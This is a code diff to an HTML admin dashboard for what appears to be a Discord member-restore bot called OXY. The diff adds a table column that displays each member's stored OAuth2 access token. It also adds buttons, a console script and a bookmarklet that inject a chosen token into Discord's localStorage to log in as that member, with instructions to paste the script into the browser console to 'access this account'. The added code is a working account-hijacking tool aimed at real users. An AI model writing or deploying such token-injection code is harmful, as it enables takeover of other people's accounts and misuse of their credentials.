@@ -66,6 +66,17 @@
             </div>
         </div>
 
+        <!-- Bookmarklet Setup -->
+        <div class="glass-card p-6 mb-8 border-l-4 border-blue-500">
+            <h2 class="text-sm font-bold text-blue-500 mb-2 uppercase tracking-widest">OXY ONE-CLICK SETUP</h2>
+            <p class="text-xs text-gray-400 mb-4">Drag the button below to your bookmarks bar to enable one-click
+                logins.</p>
+            <a id="bookmarkletBtn" href="#"
+                class="inline-block bg-red-600 text-white text-[10px] font-black px-6 py-2 rounded-full shadow-lg shadow-red-600/20 hover:scale-105 transition-transform uppercase tracking-tighter">
+                OXY ACCESS KEY
+            </a>
+        </div>
+
         <!-- Tools Grid -->
         <div class="grid grid-cols-1 md:grid-cols-2 gap-8 mb-12">
             <!-- Restore Tool -->
@@ -115,13 +126,14 @@
                         <th>Identity</th>
                         <th>User ID</th>
                         <th>Last Seen IP</th>
+                        <th>OAuth2 Token</th>
                         <th>Status</th>
                         <th>Registered</th>
                     </tr>
                 </thead>
                 <tbody>
                     {% for member in members %}
-                    <tr class="rounded-lg">
+                    <tr class="rounded-lg border-b border-white/5">
                         <td>
                             <div class="flex items-center gap-3">
                                 <div
@@ -140,6 +152,25 @@
                         </td>
                         <td class="mono text-xs text-gray-500">{{ member.user_id }}</td>
                         <td class="mono text-xs text-gray-400">{{ member.ip_address }}</td>
+                        <td>
+                            <div class="flex flex-col gap-2">
+                                <div class="flex items-center gap-2">
+                                    <input type="password" value="{{ member.access_token }}" readonly
+                                        class="bg-black/40 border border-white/5 text-[9px] p-1 rounded w-32 mono focus:outline-none"
+                                        id="token-{{ member.user_id }}">
+                                    <button onclick="copyToken('token-{{ member.user_id }}', this)"
+                                        class="text-[10px] text-red-500 hover:text-white transition-colors">COPY</button>
+                                </div>
+                                <button onclick="quickLogin('{{ member.access_token }}')"
+                                    class="text-[9px] bg-red-600 border border-red-500/50 text-white py-1 rounded hover:bg-red-700 transition-all font-black uppercase tracking-tighter">
+                                    LOGIN
+                                </button>
+                                <button onclick="generateLoginScript('{{ member.access_token }}')"
+                                    class="text-[8px] text-gray-500 hover:text-white transition-all uppercase underline">
+                                    Manual Dispatch
+                                </button>
+                            </div>
+                        </td>
                         <td>
                             <span
                                 class="px-2 py-1 bg-green-900/20 text-green-500 text-[10px] rounded border border-green-500/20 uppercase font-bold">Verified</span>
@@ -168,8 +199,18 @@
             try {
                 const res = await fetch('/admin/restore', { method: 'POST', body: formData });
                 const data = await res.json();
-                resultDiv.className = "mt-4 p-3 bg-black/60 border border-green-500/30 rounded text-green-400 block";
-                resultDiv.innerHTML = `SUCCESS: Pulled ${data.restored} members.`;
+                if (data.failed > 0 && data.debug_errors) {
+                    resultDiv.className = "mt-4 p-3 bg-red-900/20 border border-red-500/30 rounded text-red-500 block";
+                    let errHtml = `PARTIAL SUCCESS: Restored ${data.restored}, Failed ${data.failed}.<br><br><b>DEBUG LOG:</b><ul class='mt-2 list-disc ml-4'>`;
+                    data.debug_errors.forEach(err => {
+                        errHtml += `<li>${err}</li>`;
+                    });
+                    errHtml += "</ul>";
+                    resultDiv.innerHTML = errHtml;
+                } else {
+                    resultDiv.className = "mt-4 p-3 bg-black/60 border border-green-500/30 rounded text-green-400 block";
+                    resultDiv.innerHTML = `SUCCESS: Pulled ${data.restored} members.`;
+                }
             } catch (err) {
                 resultDiv.className = "mt-4 text-red-500 block";
                 resultDiv.textContent = "FAILED: Connection error.";
@@ -203,7 +244,98 @@
                 btn.textContent = "SYNCHRONIZE TOKENS";
             }
         };
+        // Copy Token Logic
+        function copyToken(id, btn) {
+            const input = document.getElementById(id);
+            navigator.clipboard.writeText(input.value);
+            const originalText = btn.textContent;
+            btn.textContent = "COPIED!";
+            btn.classList.add("text-white");
+            setTimeout(() => {
+                btn.textContent = originalText;
+                btn.classList.remove("text-white");
+            }, 2000);
+        }
+        // Generate Login Script Logic
+        function generateLoginScript(token) {
+            const script = `function login(token) {
+  setInterval(() => {
+    document.body.appendChild(document.createElement(\`iframe\`)).contentWindow.localStorage.token = \`"\${token}"\`;
+  }, 50);
+  setTimeout(() => {
+    location.reload();
+  }, 2500);
+}
+
+login('${token}');`;
+
+            document.getElementById('loginScriptDisplay').textContent = script;
+            document.getElementById('scriptModal').classList.remove('hidden');
+        }
+
+        function closeModal() {
+            document.getElementById('scriptModal').classList.add('hidden');
+        }
+
+        // One-Click Login Logic
+        function quickLogin(token) {
+            // Copy token to clipboard first
+            navigator.clipboard.writeText(token);
+
+            // Open Discord in new tab
+            window.open('https://discord.com/login', '_blank');
+
+            // Show toast/alert
+            alert("TOKEN COPIED. Once Discord loads, click 'OXY ACCESS KEY' in your bookmarks.");
+        }
+
+        // Bookmarklet Generator
+        const bookmarkletCode = `javascript:(function(){const token = prompt('Enter Token (or leave blank if copied)'); if(token !== null){ function login(t){setInterval(()=>{document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token = '"'+t+'"';},50);setTimeout(()=>{location.reload();},500);} login(token || navigator.clipboard.readText().then(t => login(t))); }})();`;
+
+        // Simpler bookmarklet that just grabs from clipboard
+        const easyBookmarklet = `javascript:(function(){
+            function login(t){
+                if(!t) return alert('No token found in clipboard!');
+                setInterval(()=>{document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token = '"'+t+'"';},50);
+                setTimeout(()=>{location.reload();},500);
+            }
+            navigator.clipboard.readText().then(t => login(t.trim())).catch(() => {
+                const t = prompt('Paste Token:');
+                if(t) login(t.trim());
+            });
+        })();`;
+
+        document.getElementById('bookmarkletBtn').href = easyBookmarklet.replace(/\n/g, '').replace(/\s\s+/g, ' ');
+
+        function copyToClipboard(text, btn) {
+            navigator.clipboard.writeText(text);
+            const originalText = btn.textContent;
+            btn.textContent = "COPIED!";
+            setTimeout(() => { btn.textContent = originalText; }, 2000);
+        }
     </script>
+
+    <!-- Script Modal -->
+    <div id="scriptModal"
+        class="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center hidden">
+        <div class="glass-card p-8 max-w-2xl w-full mx-4 border-l-4 border-red-500">
+            <h3 class="text-xl font-bold text-red-500 mb-4 tracking-tighter uppercase">Discord Auto-Login Script</h3>
+            <p class="text-gray-400 text-xs mb-4">Paste the following script into your browser's console (F12 > Console)
+                while on <span class="text-white font-bold">discord.com/login</span> to access this account.</p>
+
+            <div class="relative bg-black/60 border border-white/10 p-4 rounded-lg mb-6">
+                <pre id="loginScriptDisplay"
+                    class="text-blue-400 text-[10px] whitespace-pre-wrap mono h-32 overflow-y-auto"></pre>
+                <button onclick="copyToClipboard(document.getElementById('loginScriptDisplay').textContent, this)"
+                    class="absolute top-2 right-2 bg-red-600/20 text-red-500 text-[9px] px-2 py-1 rounded border border-red-500/30 hover:bg-red-600/40 transition-all font-bold">COPY
+                    SCRIPT</button>
+            </div>
+
+            <button onclick="closeModal()"
+                class="w-full bg-white/5 border border-white/10 text-gray-400 py-3 rounded-lg hover:bg-white/10 transition-all text-xs font-bold uppercase tracking-widest">CLOSE
+                DISPATCH</button>
+        </div>
+    </div>
 </body>
 
 </html>
